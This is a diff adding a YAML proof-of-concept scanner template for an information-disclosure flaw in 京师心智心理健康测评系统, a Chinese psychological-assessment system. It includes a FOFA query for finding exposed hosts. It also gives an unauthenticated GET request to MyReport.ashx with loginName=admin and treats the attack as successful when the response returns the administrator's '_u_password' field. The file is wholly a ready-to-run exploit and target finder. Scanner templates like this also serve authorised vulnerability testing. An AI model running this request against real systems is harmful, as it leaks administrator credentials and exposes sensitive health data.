@@ -1,0 +1,22 @@
+id: poc-yaml-jsxz-ceping-myreport-ashx-info-disclosure
+info:
+  name: 京师心智心理健康测评系统 MyReport.ashx 敏感信息泄露漏洞
+  severity: high
+  tags:
+  - 信息泄露
+  finger: 京师心智心理健康测评系统
+  fofa: body="JS/ligerComboBox/ligerTree.js"
+requests:
+- method: GET
+  path: /FunctionModular/PersonalReport/Ajax/MyReport.ashx?type=3&loginName=admin
+  expression: 'status_code == 200 &&
+
+    contains(body,"\"_u_password\"") &&
+
+    contains(body,"管理员") &&
+
+    !contains(body,"<html")
+
+    '
+variables: {}
+transport: http
